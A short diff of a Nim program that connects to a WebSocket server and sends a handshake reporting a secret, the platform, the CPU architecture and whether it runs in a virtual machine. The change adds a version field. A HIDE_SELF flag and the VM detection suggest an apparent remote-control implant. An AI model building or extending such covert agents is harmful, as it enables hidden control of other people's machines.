@@ -4,6 +4,8 @@ import osproc
 import strformat
 import asyncdispatch, ws
 
+const VERSION = 0
+
 const HIDE_SELF = false
 
 # TODO: Implement
@@ -32,7 +34,7 @@ proc main() {.async.} =
   var ws = await newWebSocket(WS_URL)
 
   # Send handshake and identify ourselves
-  discard ws.send($(%*{"secret": SECRET, "platform": PLATFORM, "architecture": hostCPU, "vm": IS_VM}))
+  discard ws.send($(%*{"secret": SECRET, "platform": PLATFORM, "architecture": hostCPU, "vm": IS_VM, "version": VERSION}))
 
   let resp = parseJson(await ws.receiveStrPacket())
 
